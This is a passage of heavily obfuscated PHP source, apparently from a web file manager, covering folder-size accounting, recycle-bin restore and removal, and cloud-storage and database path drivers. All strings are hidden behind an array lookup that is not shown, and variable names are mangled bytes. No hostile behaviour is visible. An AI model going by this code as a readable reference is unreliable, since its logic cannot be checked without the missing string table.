array($©¼œ¦²Ò[193] => array($©¼œ¦²Ò[501], $İÜƒ¼Å¬)); if ($”òÎ´æÜ < 0) { $ıÁª‰Î†[$©¼œ¦²Ò[79]] = array($©¼œ¦²Ò[1090], abs($”òÎ´æÜ)); } $this->where($ıÁª‰Î†)->setAdd($©¼œ¦²Ò[79], $”òÎ´æÜ); CacheLock::unlock($‹Îİ¹ê); $–„Ü¤ = $©¼œ¦²Ò[2276] . $Í¯€³ú [$©¼œ¦²Ò[190]] . $©¼œ¦²Ò[4] . $Í¯€³ú [$©¼œ¦²Ò[578]]; $ÒÅı½”Ş = array($Í¯€³ú [$©¼œ¦²Ò[190]], $Í¯€³ú [$©¼œ¦²Ò[578]]); TaskRun::timeLimitCall($–„Ü¤, $©¼œ¦²Ò[2277], $ÒÅı½”Ş, 1.5); } public function folderSizeResetChildren($ö‡¨´øÄ) { $åöÎ½Ó =& $_SERVER[³Ôà×Ó]; $this->sourceCacheClear($ö‡¨´øÄ); $˜å‰ÈÀ€ = $this->sourceInfo($ö‡¨´øÄ); $°Ìå•ş = array($åöÎ½Ó[655] => 1, $åöÎ½Ó[658] => $˜å‰ÈÀ€[$åöÎ½Ó[578]], $åöÎ½Ó[661] => array($åöÎ½Ó[621], $˜å‰ÈÀ€[$åöÎ½Ó[593]] . $ö‡¨´øÄ . $åöÎ½Ó[622])); $â¼äö™ô = $åöÎ½Ó[2278]; $¹àÊ÷¸Œ = $this->field($â¼äö™ô)->where($°Ìå•ş)->select(); $°Ìå•ş[$åöÎ½Ó[494]] = 0; $âºÏ“Âü = $this->field($â¼äö™ô)->where($°Ìå•ş)->select(); if (!$âºÏ“Âü) { return; } $¹àÊ÷¸Œ[] = $˜å‰ÈÀ€; $¹àÊ÷¸Œ = array_to_keyvalue($¹àÊ÷¸Œ, $åöÎ½Ó[193]); foreach ($¹àÊ÷¸Œ as $í‰Ş¯²¿ => $Ã¿ğ¹ä) { $¹àÊ÷¸Œ[$í‰Ş¯²¿][$åöÎ½Ó[2279]] = $¹àÊ÷¸Œ[$í‰Ş¯²¿][$åöÎ½Ó[79]]; $¹àÊ÷¸Œ[$í‰Ş¯²¿][$åöÎ½Ó[79]] = 0; } foreach ($âºÏ“Âü as $Ã¿ğ¹ä) { $îá»òåÛ = $Ã¿ğ¹ä[$åöÎ½Ó[192]] . $åöÎ½Ó[12]; if (!isset($¹àÊ÷¸Œ[$îá»òåÛ])) { continue; } if ($Ã¿ğ¹ä[$åöÎ½Ó[514]] == $¹àÊ÷¸Œ[$îá»òåÛ][$åöÎ½Ó[514]]) { $¹àÊ÷¸Œ[$îá»òåÛ][$åöÎ½Ó[79]] += $Ã¿ğ¹ä[$åöÎ½Ó[79]]; } } foreach ($¹àÊ÷¸Œ as $Ã¿ğ¹ä) { $¼’ì¢¬Š = $this->parentLevelArray($Ã¿ğ¹ä[$åöÎ½Ó[593]]); foreach ($¼’ì¢¬Š as $îá»òåÛ) { $îá»òåÛ = $îá»òåÛ . $åöÎ½Ó[12]; if (!isset($¹àÊ÷¸Œ[$îá»òåÛ])) { continue; } if ($Ã¿ğ¹ä[$åöÎ½Ó[514]] == $¹àÊ÷¸Œ[$îá»òåÛ][$åöÎ½Ó[514]]) { $¹àÊ÷¸Œ[$îá»òåÛ][$åöÎ½Ó[79]] += $Ã¿ğ¹ä[$åöÎ½Ó[79]]; } } } $‹œæù£Õ = array(); foreach ($¹àÊ÷¸Œ as $Ã¿ğ¹ä) { if ($Ã¿ğ¹ä[$åöÎ½Ó[79]] == $Ã¿ğ¹ä[$åöÎ½Ó[2279]]) { continue; } $‹œæù£Õ[] = array($åöÎ½Ó[193], $Ã¿ğ¹ä[$åöÎ½Ó[193]], $åöÎ½Ó[79], $Ã¿ğ¹ä[$åöÎ½Ó[79]]); } $this->saveAll($‹œæù£Õ); } public function userSpaceReset($‰ğ÷¶İØ = false) { $Í³†¼À =& $_SERVER[³Ôà×Ó]; $ËØú‡Å¢ = $this->where(array($Í³†¼À[190] => self::TYPE_USER, $Í³†¼À[578] => $‰ğ÷¶İØ, $Í³†¼À[494] => 0))->sum($Í³†¼À[79]); $ËØú‡Å¢ = !$ËØú‡Å¢ || $ËØú‡Å¢ <= 0 ? 0 : $ËØú‡Å¢; Model($Í³†¼À[586])->userEdit($‰ğ÷¶İØ, array($Í³†¼À[1952] => $ËØú‡Å¢)); } public function targetSpaceUpdate($ô©Èñ¥, $Û²›Ôåí) { $“ü·ªíñ =& $_SERVER[³Ôà×Ó]; if (!$Û²›Ôåí) { return; } if (!in_array($ô©Èñ¥, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $¤ˆû½¼ = $this->targetSpaceSize($ô©Èñ¥, $Û²›Ôåí); if ($ô©Èñ¥ == self::TYPE_USER) { Model($“ü·ªíñ[586])->userEdit($Û²›Ôåí, array($“ü·ªíñ[1952] => $¤ˆû½¼)); } else { if ($ô©Èñ¥ == self::TYPE_GROUP) { Model($“ü·ªíñ[594])->groupEdit($Û²›Ôåí, array($“ü·ªíñ[1952] => $¤ˆû½¼)); } } } public function targetSpaceSize($Ğœ—µ®Ó, $ëÛ­‰°à) { $äÇ¾Ë¹ =& $_SERVER[³Ôà×Ó]; $ğŸ°çä× = 0; $Ü¢†ÎŞƒ = $this->targetSourceRoot($Ğœ—µ®Ó, $ëÛ­‰°à, !0); foreach ($Ü¢†ÎŞƒ as $¯õ…ÌÎ) { if (!$¯õ…ÌÎ) { continue; } $ğŸ°çä× += floatval($¯õ…ÌÎ[$äÇ¾Ë¹[79]]); $íğ¼¹ã˜ = array($äÇ¾Ë¹[661] => array($äÇ¾Ë¹[621], $äÇ¾Ë¹[603] . $¯õ…ÌÎ[$äÇ¾Ë¹[193]] . $äÇ¾Ë¹[622])); $¥ÓÜıàÂ = Model($äÇ¾Ë¹[512])->field($äÇ¾Ë¹[500])->where($íğ¼¹ã˜)->select(); $¥ÓÜıàÂ = array_to_keyvalue($¥ÓÜıàÂ, $äÇ¾Ë¹[12], $äÇ¾Ë¹[193]); $¥ÓÜıàÂ = array_unique(array_filter($¥ÓÜıàÂ)); if ($¥ÓÜıàÂ) { $íğ¼¹ã˜ = array($äÇ¾Ë¹[500] => array($äÇ¾Ë¹[501], $¥ÓÜıàÂ)); $ğŸ°çä× += floatval($this->where($íğ¼¹ã˜)->sum($äÇ¾Ë¹[79])); } } $ğŸ°çä× = !$ğŸ°çä× || $ğŸ°çä× <= 0 ? 0 : $ğŸ°çä×; return $ğŸ°çä×; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¨Î¿¾Å—) { return $this->fileTypeProfile($¨Î¿¾Å—, SourceModel::TYPE_USER); } public function groupFileTypeProfile($€ê‰¦òˆ) { return $this->fileTypeProfile($€ê‰¦òˆ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ÈÌÔìÕ, $äŒï®°³) { $ĞŠÙ¾Ìà =& $_SERVER[³Ôà×Ó]; $†­Í‹  = $ĞŠÙ¾Ìà[2280] . $ÈÌÔìÕ . $ĞŠÙ¾Ìà[11] . $äŒï®°³; $áÀùáĞ³ = Cache::get($†­Í‹ ); if ($áÀùáĞ³) { return $áÀùáĞ³; } $é‚½ñ•ô = array($ĞŠÙ¾Ìà[655] => 0); if ($ÈÌÔìÕ != !1) { $é‚½ñ•ô[$ĞŠÙ¾Ìà[578]] = $ÈÌÔìÕ; $é‚½ñ•ô[$ĞŠÙ¾Ìà[190]] = $äŒï®°³; } $ŞÛ“… = array(); $ŞÛ“…[$ĞŠÙ¾Ìà[2281]] = array($ĞŠÙ¾Ìà[2282] => LNG($ĞŠÙ¾Ìà[2281]), $ĞŠÙ¾Ìà[2283] => $this->where($é‚½ñ•ô)->count(), $ĞŠÙ¾Ìà[626] => $this->where($é‚½ñ•ô)->sum($ĞŠÙ¾Ìà[79])); $Êû”…Œ = KodIO::fileTypeList(); foreach ($Êû”…Œ as $²šö«ˆ¦ => $‡ÇŸ÷í¬) { $é‚½ñ•ô[$ĞŠÙ¾Ìà[495]] = $this->fileTypeWhere($²šö«ˆ¦); $ŞÛ“…[$²šö«ˆ¦] = array($ĞŠÙ¾Ìà[2282] => $‡ÇŸ÷í¬[$ĞŠÙ¾Ìà[32]], $ĞŠÙ¾Ìà[2283] => $this->where($é‚½ñ•ô)->count(), $ĞŠÙ¾Ìà[626] => $this->where($é‚½ñ•ô)->sum($ĞŠÙ¾Ìà[79])); } Cache::set($†­Í‹ , $ŞÛ“…, 1200); return $ŞÛ“…; } public function fileNameExist($÷ç•œ½¥, $Âº’ëÎÉ) { $øğ™Ö½ú =& $_SERVER[³Ôà×Ó]; $¬×§‘´ = $this->field($øğ™Ö½ú[2284])->where(array($øğ™Ö½ú[192] => $÷ç•œ½¥, $øğ™Ö½ú[32] => $Âº’ëÎÉ, $øğ™Ö½ú[514] => 0))->find(); return is_array($¬×§‘´) ? $¬×§‘´[$øğ™Ö½ú[193]] : !1; } public function childList($â Øá¡¥) { $¼Ú¿ñÔÓ =& $_SERVER[³Ôà×Ó]; $™¿Ì¸Ùê = $¼Ú¿ñÔÓ[2257] . $â Øá¡¥; if (isset(self::$cacheChildList[$™¿Ì¸Ùê])) { return self::$cacheChildList[$™¿Ì¸Ùê]; } $… ûº¤€ = array($¼Ú¿ñÔÓ[192] => intval($â Øá¡¥), $¼Ú¿ñÔÓ[514] => 0); $ÎéÛºÒÙ = $this->where($… ûº¤€)->select(); $ÎéÛºÒÙ = $ÎéÛºÒÙ ? $ÎéÛºÒÙ : array(); self::$cacheChildList[$™¿Ì¸Ùê] = $ÎéÛºÒÙ; foreach ($ÎéÛºÒÙ as $½©åëÂÁ) { $™¿Ì¸Ùê = $¼Ú¿ñÔÓ[542] . $½©åëÂÁ[$¼Ú¿ñÔÓ[193]]; self::$cacheSourceInfo[$™¿Ì¸Ùê] = $½©åëÂÁ; } return $ÎéÛºÒÙ; } public function fileNameAuto($Ì¸’·Í“, $¾²¼âê–, $ÌÈÒª¶ñ = REPEAT_RENAME, $ûÁÒåãÅ = false) { $›¹í÷ˆì =& $_SERVER[³Ôà×Ó]; $‡æÃÕ = get_path_ext($¾²¼âê–); $»³ƒÉ¾ñ = $‡æÃÕ ? get_path_ext_name($¾²¼âê–) . $›¹í÷ˆì[2285] . $‡æÃÕ : $¾²¼âê– . $›¹í÷ˆì[469]; $—Àƒøı = array($›¹í÷ˆì[192] => $Ì¸’·Í“, $›¹í÷ˆì[514] => 0, $›¹í÷ˆì[32] => array($›¹í÷ˆì[468], $»³ƒÉ¾ñ)); $ÌºïÁˆ = $this->field($›¹í÷ˆì[32])->where($—Àƒøı)->select(); $üòò  = array_to_keyvalue($ÌºïÁˆ, $›¹í÷ˆì[12], $›¹í÷ˆì[32]); return $this->fileNameAutoGet($üòò , $¾²¼âê–, $ÌÈÒª¶ñ, $ûÁÒåãÅ); } public function fileNameAutoGet($ƒ¯ò¤Ş, $ øùôˆË, $¿¶È¹«, $—ŒÛâê ) { $Ê†ç¸‘ =& $_SERVER[³Ôà×Ó]; if ($¿¶È¹« == REPEAT_REPLACE || !$ƒ¯ò¤Ş || !in_array_not_case($ øùôˆË, $ƒ¯ò¤Ş) || $—ŒÛâê  && $¿¶È¹« != REPEAT_RENAME_FOLDER) { return $ øùôˆË; } if ($¿¶È¹« == REPEAT_SKIP) { return !1; } $ºü²ä = $Ê†ç¸‘[10] . get_path_ext($ øùôˆË); $ºü²ä = $ºü²ä == $Ê†ç¸‘[10] || $—ŒÛâê  ? $Ê†ç¸‘[12] : $ºü²ä; for ($Üô’’¶ = 1; $Üô’’¶ <= count($ƒ¯ò¤Ş) + 1; $Üô’’¶++) { $€˜¤¨‡â = substr($ øùôˆË, 0, strlen($ øùôˆË) - strlen($ºü²ä)); $«§÷â˜ı = $€˜¤¨‡â . "\x28{$Üô’’¶}\x29{$ºü²ä}"; if (!in_array_not_case($«§÷â˜ı, $ƒ¯ò¤Ş)) { return $«§÷â˜ı; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\165\x72\x63\145\x5f\162\145\143\x79\143\154\x65"; protected $dataAuto = array(array("\x63\x72\x65\141\164\145\124\151\x6d\145", "\164\151\155\145", "\151\156\163\x65\162\164", "\146\165\x6e\x63\x74\151\x6f\x6e")); public function listData($§ìãÜş£ = false) { $ô…İÛÂÈ =& $_SERVER[³Ôà×Ó]; $§ìãÜş£ = $§ìãÜş£ ? $§ìãÜş£ : USER_ID; $ºÕà¶ç = $this->where(array($ô…İÛÂÈ[1756] => $§ìãÜş£))->select(); return array_to_keyvalue($ºÕà¶ç, $ô…İÛÂÈ[12], $ô…İÛÂÈ[193]); } public function moveToRecycle($ÄÅı·Ş–) { $²”“¬Á÷ =& $_SERVER[³Ôà×Ó]; $˜Õ°é‹ = Model($²”“¬Á÷[1414]); $˜òÄôåê = $˜Õ°é‹->sourceInfo($ÄÅı·Ş–); if (!$˜òÄôåê || $˜òÄôåê[$²”“¬Á÷[514]] == $²”“¬Á÷[91]) { return; } $ÕÉÚíü = array($²”“¬Á÷[500] => $ÄÅı·Ş–, $²”“¬Á÷[1756] => USER_ID, $²”“¬Á÷[657] => $˜òÄôåê[$²”“¬Á÷[190]], $²”“¬Á÷[658] => $˜òÄôåê[$²”“¬Á÷[578]], $²”“¬Á÷[661] => $˜òÄôåê[$²”“¬Á÷[593]]); $this->add($ÕÉÚíü); $this->recycleMove($ÄÅı·Ş–, 1); if ($˜òÄôåê[$²”“¬Á÷[494]] == $²”“¬Á÷[91]) { $ìÑŒ÷Ú° = array($²”“¬Á÷[661] => array($²”“¬Á÷[621], $˜òÄôåê[$²”“¬Á÷[593]] . $ÄÅı·Ş– . $²”“¬Á÷[622])); $˜Õ°é‹->where($ìÑŒ÷Ú°)->setField($²”“¬Á÷[514], 1); } } public function clear() { $this->remove(!1); } public function remove($ªâ§˜Åç = false, $³å´›ïÚ = false) { $äàš’± =& $_SERVER[³Ôà×Ó]; $³å´›ïÚ = $³å´›ïÚ ? $³å´›ïÚ : USER_ID; $Œ»®üç¸ = Model($äàš’±[1414]); $ÍÀ„ Èˆ = $this->listData($³å´›ïÚ); $ªâ§˜Åç = $ªâ§˜Åç === !1 ? !1 : $ªâ§˜Åç; $×„¼¼ë = array(); foreach ($ÍÀ„ Èˆ as $ã–»è€œ) { if ($ªâ§˜Åç != !1 && !in_array($ã–»è€œ, $ªâ§˜Åç)) { continue; } $‚ì¶ÂÆÀ = $Œ»®üç¸->sourceInfo($ã–»è€œ); $Œ»®üç¸->remove($ã–»è€œ, !1); $åğ‰»¶õ = $‚ì¶ÂÆÀ[$äàš’±[190]] . $äàš’±[11] . $‚ì¶ÂÆÀ[$äàš’±[578]]; $×„¼¼ë[$åğ‰»¶õ] = array($äàš’±[657] => $‚ì¶ÂÆÀ[$äàš’±[190]], $äàš’±[578] => $‚ì¶ÂÆÀ[$äàš’±[578]]); $this->where(array($äàš’±[193] => $ã–»è€œ))->delete(); } foreach ($×„¼¼ë as $·¬×öÁæ) { $Œ»®üç¸->targetSpaceUpdate($·¬×öÁæ[$äàš’±[190]], $·¬×öÁæ[$äàš’±[578]]); } } public function restore($“£ºßµ÷ = false) { $’Œœì±Ÿ = $this->listData(); $this->_restoreSource($’Œœì±Ÿ, $“£ºßµ÷); } public function removeUserAll($Âğİ‰ğ—) { $this->remove(!1, $Âğİ‰ğ—); } public function restoreItem($šş¯ñÄš) { $this->_restoreSource(array($šş¯ñÄš), array($šş¯ñÄš)); } private function _restoreSource($µ¼–­ƒ, $ò¦’³Ôè) { $’ôŒó =& $_SERVER[³Ôà×Ó]; $¯¢ÈîÔ = Model($’ôŒó[1414]); $ò¦’³Ôè = $ò¦’³Ôè == !1 ? !1 : $ò¦’³Ôè; if (!$µ¼–­ƒ) { return !0; } $´ùÍÍ¶Õ = array(); foreach ($µ¼–­ƒ as $œÜ€É¼) { if ($ò¦’³Ôè != !1 && !in_array($œÜ€É¼, $ò¦’³Ôè)) { continue; } $Ñ°ãÑó¶ = $¯¢ÈîÔ->sourceInfo($œÜ€É¼); $çÍŞÇËõ = $¯¢ÈîÔ->sourceInfo($Ñ°ãÑó¶[$’ôŒó[192]]); if ($çÍŞÇËõ[$’ôŒó[514]] == $’ôŒó[91]) { continue; } $¯¢ÈîÔ->lockMoveStart($œÜ€É¼); $this->recycleMove($œÜ€É¼, 0); if ($Ñ°ãÑó¶[$’ôŒó[494]] == $’ôŒó[91]) { $ø£ô¶Õü = array($’ôŒó[661] => array($’ôŒó[621], $Ñ°ãÑó¶[$’ôŒó[593]] . $œÜ€É¼ . $’ôŒó[622])); $¯¢ÈîÔ->where($ø£ô¶Õü)->setField($’ôŒó[514], 0); $this->restoreFolderChildren($œÜ€É¼, $µ¼–­ƒ); } $this->where(array($’ôŒó[193] => $œÜ€É¼))->delete(); $¯¢ÈîÔ->folderSizeReset($Ñ°ãÑó¶[$’ôŒó[192]]); $´ùÍÍ¶Õ[] = $Ñ°ãÑó¶[$’ôŒó[192]]; if ($Ñ°ãÑó¶[$’ôŒó[494]] == $’ôŒó[91]) { $´ùÍÍ¶Õ[] = $œÜ€É¼; } $¯¢ÈîÔ->lockMoveEnd($œÜ€É¼); } $¯¢ÈîÔ->updateModifyTime($´ùÍÍ¶Õ); } private function restoreFolderChildren($Ó¤”Û²÷, $¼Ì±ŠÄÙ) { $”™á«Áñ =& $_SERVER[³Ôà×Ó]; $è†ß¯ØÜ = Model($”™á«Áñ[1414]); $¼â¯À = array($”™á«Áñ[193] => array($”™á«Áñ[7], array())); foreach ($¼Ì±ŠÄÙ as $Ü½ş£”) { if ($Ü½ş£” == $Ó¤”Û²÷) { continue; } if (!$è†ß¯ØÜ->isParentOf($Ó¤”Û²÷, $Ü½ş£”)) { continue; } $ş¨’ë‰ = $è†ß¯ØÜ->sourceInfo($Ü½ş£”); if ($ş¨’ë‰[$”™á«Áñ[494]] == $”™á«Áñ[91]) { $¼â¯À[] = array($”™á«Áñ[661] => array($”™á«Áñ[621], $ş¨’ë‰[$”™á«Áñ[593]] . $Ü½ş£” . $”™á«Áñ[622])); } else { $¼â¯À[$”™á«Áñ[193]][1][] = $Ü½ş£”; } } if (!$¼â¯À[$”™á«Áñ[193]][1]) { unset($¼â¯À[$”™á«Áñ[193]]); } if (!$¼â¯À) { return; } if (is_array($¼â¯À[$”™á«Áñ[193]]) && is_array($¼â¯À[$”™á«Áñ[193]][1])) { $¼â¯À[$”™á«Áñ[193]][1] = array_unique($¼â¯À[$”™á«Áñ[193]][1]); } $¼â¯À[$”™á«Áñ[1075]] = $”™á«Áñ[2065]; $è†ß¯ØÜ->where($¼â¯À)->setField($”™á«Áñ[514], 1); } private function recycleMove($¢×üèÓî, $Â°¤Õ µ = 1) { $Şé¨ùÊú =& $_SERVER[³Ôà×Ó]; $Á¸Ø¶ß = Model($Şé¨ùÊú[1414]); $°ËŒØ¤‹ = Model($Şé¨ùÊú[2286]); $³ÚÂ¶ƒÄ = array($Şé¨ùÊú[193] => $¢×üèÓî); if ($Â°¤Õ µ) { $Á¸Ø¶ß->where($³ÚÂ¶ƒÄ)->setField($Şé¨ùÊú[514], 1); $°ËŒØ¤‹->eventRecycle($¢×üèÓî, $Şé¨ùÊú[2287]); } else { $œß™‹ö³ = $Á¸Ø¶ß->where($³ÚÂ¶ƒÄ)->find(); $ö¶ÕÆ˜© = $œß™‹ö³[$Şé¨ùÊú[494]] == $Şé¨ùÊú[91]; $«òÁëÒÛ = $Á¸Ø¶ß->fileNameAuto($œß™‹ö³[$Şé¨ùÊú[192]], $œß™‹ö³[$Şé¨ùÊú[32]], REPEAT_RENAME_FOLDER, $ö¶ÕÆ˜©); if ($«òÁëÒÛ != $œß™‹ö³[$Şé¨ùÊú[32]]) { $Á¸Ø¶ß->rename($¢×üèÓî, $«òÁëÒÛ); } $Á¸Ø¶ß->where($³ÚÂ¶ƒÄ)->setField($Şé¨ùÊú[514], 0); $°ËŒØ¤‹->eventRecycle($¢×üèÓî, $Şé¨ùÊú[2288]); } } } goto bà×œÇ©¯½; AàœŸÒİ¨¼: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($¥ºÎŠ…‚) { parent::__construct($¥ºÎŠ…‚); $this->setSignVersion($_SERVER[³Ôà×Ó][247]); } public function uploadFormData($‚º³€çÁ, $ò³ØÕ²¹ = 3600) { $«ëÛ£éö =& $_SERVER[³Ôà×Ó]; $Ô’õºñ£ = $«ëÛ£éö[229]; $ÛˆÅú€ó = $«ëÛ£éö[263]; $‘Õ Ë° = $«ëÛ£éö[274]; $±õåÏ½í = gmdate($«ëÛ£éö[299], time() + $ò³ØÕ²¹); $¼½™áíù = (string) time() . $«ëÛ£éö[74] . (string) (time() + $ò³ØÕ²¹); $™‚öÍä = array($«ëÛ£éö[275] => $±õåÏ½í, $«ëÛ£éö[278] => array(array($«ëÛ£éö[280] => $Ô’õºñ£), array($«ëÛ£éö[279] => $this->bucket), array($«ëÛ£éö[281], $«ëÛ£éö[282], $«ëÛ£éö[12]), array($«ëÛ£éö[285] => $‘Õ Ë°), array($«ëÛ£éö[1407] => $ÛˆÅú€ó), array($«ëÛ£éö[1408] => $this->accessKey), array($«ëÛ£éö[1409] => $¼½™áíù))); $™‚öÍä = json_encode($™‚öÍä); $É“æñ = hash_hmac($«ëÛ£éö[263], $¼½™áíù, $this->secret); $ƒÔ–îÍ¡ = sha1($™‚öÍä); $—½Öéç¤ = hash_hmac($«ëÛ£éö[263], $ƒÔ–îÍ¡, $É“æñ); $—¥ˆà¹ = array($«ëÛ£éö[280] => $Ô’õºñ£, $«ëÛ£éö[285] => $‘Õ Ë°, $«ëÛ£éö[293] => base64_encode($™‚öÍä), $«ëÛ£éö[1407] => $ÛˆÅú€ó, $«ëÛ£éö[1408] => $this->accessKey, $«ëÛ£éö[1410] => $¼½™áíù, $«ëÛ£éö[1411] => $—½Öéç¤, $«ëÛ£éö[208] => $this->getHost()); return $—¥ˆà¹; } public function fileOutImage($Ë©±óÔ, $ôÂı‘ôÕ = 250) { $¾ˆäÜÌ =& $_SERVER[³Ôà×Ó]; if ($this->size($Ë©±óÔ) > 1024 * 1024 * 32) { return $this->fileOutImageServer($Ë©±óÔ, $ôÂı‘ôÕ); } $×ßèÌ‘“ = $this->link($Ë©±óÔ); $×ßèÌ‘“ .= $¾ˆäÜÌ[1412] . $ôÂı‘ôÕ . $¾ˆäÜÌ[1413]; $this->fileOutLink($×ßèÌ‘“); } public function fileOutLink($Ü¾ÕÅü§) { $™š¾à¬Ï =& $_SERVER[³Ôà×Ó]; if (substr($Ü¾ÕÅü§, 0, 7) == $™š¾à¬Ï[313]) { $Ü¾ÕÅü§ = $™š¾à¬Ï[314] . substr($Ü¾ÕÅü§, 7); } header($™š¾à¬Ï[175] . $Ü¾ÕÅü§); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Ô¹ˆØÃÎ) { $this->pathParse = $Ô¹ˆØÃÎ; $this->model = Model($_SERVER[³Ôà×Ó][1414]); } public function getPath($«Ì¢ÔñË) { return trim($«Ì¢ÔñË, $_SERVER[³Ôà×Ó][8]); } public function pathFather($ËØÌ´ê) { $§ÆßÉ…Î = $this->parse($ËØÌ´ê); $§ÆßÉ…Î = $this->infoSimple($ËØÌ´ê); return $§ÆßÉ…Î ? $§ÆßÉ…Î[$_SERVER[³Ôà×Ó][192]] : !1; } public function pathThis($‚ÔÕï‡ª) { $¶¸Ë™½ = $this->infoSimple($‚ÔÕï‡ª); return $¶¸Ë™½ ? $¶¸Ë™½[$_SERVER[³Ôà×Ó][32]] : !1; } public function getPathOuter($‘ÚÑè’ì) { if (!$‘ÚÑè’ì) { return $‘ÚÑè’ì; } $Êˆà¤¼ = $this->parse($‘ÚÑè’ì); return KodIO::make($Êˆà¤¼[$_SERVER[³Ôà×Ó][484]]); } public function copyFolderFromIO($öÍïŠñ, $˜˜ÇÈü‹, $Çœæ£´, $‡²³«ß¿, $ ¡•„ü) { $ùÁ²“ç† = $this->model->copyFolderFromIO($öÍïŠñ, $˜˜ÇÈü‹, $Çœæ£´, $‡²³«ß¿, $ ¡•„ü); return KodIO::make($ùÁ²“ç†); } public function isParentOf($ŠïªµË³, $’¦†¥š) { return $this->model->isParentOf($ŠïªµË³, $’¦†¥š); } public function mkfile($ó¼šî×ç, $•¡Ç„® = '', $°ìÖ”¸á = REPEAT_RENAME) { $€˜šº§Ì =& $_SERVER[³Ôà×Ó]; $¸‡‹ÁÍù = $this->parse($ó¼šî×ç); $ó¼šî×ç = $¸‡‹ÁÍù[$€˜šº§Ì[484]]; for ($ÌÑÎ—Ïü = 0; $ÌÑÎ—Ïü < count($¸‡‹ÁÍù[$€˜šº§Ì[1415]]); $ÌÑÎ—Ïü++) { $¬±´··Ä = $¸‡‹ÁÍù[$€˜šº§Ì[1415]][$ÌÑÎ—Ïü]; if ($ÌÑÎ—Ïü == count($¸‡‹ÁÍù[$€˜šº§Ì[1415]]) - 1) { $ó¼šî×ç = $this->model->mkfile($ó¼šî×ç, $¬±´··Ä, $•¡Ç„®, $°ìÖ”¸á); break; } $ó¼šî×ç = $this->model->mkdir($ó¼šî×ç, $¬±´··Ä, REPEAT_SKIP); } return $this->getPathOuter($ó¼šî×ç); } public function mkdir($ú¹¬˜Ôã, $²É…–åÕ = REPEAT_SKIP) { $¡àŠŞÍ‰ =& $_SERVER[³Ôà×Ó]; $ÇÜëÍ‰Ó = $this->parse($ú¹¬˜Ôã); $ú¹¬˜Ôã = $ÇÜëÍ‰Ó[$¡àŠŞÍ‰[484]]; for ($›£šÁ§Š = 0; $›£šÁ§Š < count($ÇÜëÍ‰Ó[$¡àŠŞÍ‰[1415]]); $›£šÁ§Š++) { $öÓ™á¼‹ = $ÇÜëÍ‰Ó[$¡àŠŞÍ‰[1415]][$›£šÁ§Š]; $ú¹¬˜Ôã = $this->model->mkdir($ú¹¬˜Ôã, $öÓ™á¼‹, $²É…–åÕ); } return $this->getPathOuter($ú¹¬˜Ôã); } public function copyFile($ø»¤ŠÔğ, $“£ÀÌ…Ü, $ğ¯Çà’ı = REPEAT_REPLACE) { $¿ÔĞ§Ü =& $_SERVER[³Ôà×Ó]; $ç®ï©¾È = $this->parse($“£ÀÌ…Ü); $ ö¬åŠ = $this->model->copy($ø»¤ŠÔğ, $ç®ï©¾È[$¿ÔĞ§Ü[484]], $ğ¯Çà’ı, $ç®ï©¾È[$¿ÔĞ§Ü[87]]); return $ ö¬åŠ ? $this->getPathOuter($ ö¬åŠ) : !1; } public function moveFile($íòœ¯ı, $Õı—’Îİ, $¨•´®ş = REPEAT_REPLACE) { $ôŒ„£¾‚ =& $_SERVER[³Ôà×Ó]; $°Ëƒ„Š¯ = $this->parse($Õı—’Îİ); $úèŞ¯â = $this->model->move($íòœ¯ı, $°Ëƒ„Š¯[$ôŒ„£¾‚[484]], $¨•´®ş, $°Ëƒ„Š¯[$ôŒ„£¾‚[87]]); return $úèŞ¯â ? $this->getPathOuter($úèŞ¯â) : !1; } public function copy($«ˆ³åÍŒ, $Ü¨àßû, $Í¤Äã™ï = REPEAT_REPLACE, $µ€«Éˆ = false) { $˜ûõ„¡Á = $this->parse($Ü¨àßû); $½Ó®íìÖ = $this->model->copy($«ˆ³åÍŒ, $˜ûõ„¡Á[$_SERVER[³Ôà×Ó][484]], $Í¤Äã™ï, $µ€«Éˆ); return $½Ó®íìÖ ? $this->getPathOuter($½Ó®íìÖ) : !1; } public function moveSameAllow() { } public function move($ûÊ‰ãß˜, $«–äëûö, $ÕÁÈ¥’ş = REPEAT_REPLACE, $‡„€åÊş = false) { $ò†ıæ‰ = $this->parse($«–äëûö); $æÇÛÚÀö = $this->model->move($ûÊ‰ãß˜, $ò†ıæ‰[$_SERVER[³Ôà×Ó][484]], $ÕÁÈ¥’ş, $‡„€åÊş); return $æÇÛÚÀö ? $this->getPathOuter($æÇÛÚÀö) : !1; } public function remove($ÂèõÛ£ø, $Ÿª†Œ¡ = true) { return $this->model->remove($ÂèõÛ£ø, $Ÿª†Œ¡); } public function rename($‰á€Õñ, $ŸŸ›ùé”) { $¹üìûâ™ = $this->model->rename($‰á€Õñ, $ŸŸ›ùé”); return $¹üìûâ™ ? $this->getPathOuter($‰á€Õñ) : $¹üìûâ™; } public function size($¸ã€ò¬õ) { $„·ƒĞ‹– = $this->infoSimple($¸ã€ò¬õ); return $„·ƒĞ‹– ? $„·ƒĞ‹–[$_SERVER[³Ôà×Ó][79]] : 0; } public function infoSimple($Ê­şôøé) { return $this->model->sourceInfo($Ê­şôøé); } public function info($ÙüÀ£€) { return $this->infoParse($ÙüÀ£€); } public function infoAuth($‚ãŞù) { return $this->infoParse($‚ãŞù, !1, !0); } public function infoWithChildren($å‰º Ó¨) { return $this->infoParse($å‰º Ó¨, !0); } protected function infoParse($‡ŠÂ¦, $åÑÎ¾õ = false, $íß”êÅ¡ = false) { if (!$åÑÎ¾õ) { return $this->model->pathInfo($‡ŠÂ¦, $íß”êÅ¡); } return $this->model->pathInfoMore($‡ŠÂ¦); } public function infoFullSimple($­ı§ğ®à) { $ßú·Ô‡æ =& $_SERVER[³Ôà×Ó]; $’ßÁ£¬• = explode($ßú·Ô‡æ[8], $­ı§ğ®à); $º›ÖìÉá = implode($ßú·Ô‡æ[8], array_splice($’ßÁ£¬•, 1)); return $this->model->pathInfoByPath($’ßÁ£¬•[0], $º›ÖìÉá); } public function infoFull($ô‚›À‘´) { $÷ò¯ò³ = $this->infoFullSimple($ô‚›À‘´); return is_array($÷ò¯ò³) ? $this->model->pathInfo($÷ò¯ò³[$_SERVER[³Ôà×Ó][193]]) : !1; } public function hashSimple($óÓ±¸¹Ã) { $ûÁäÉûÁ =& 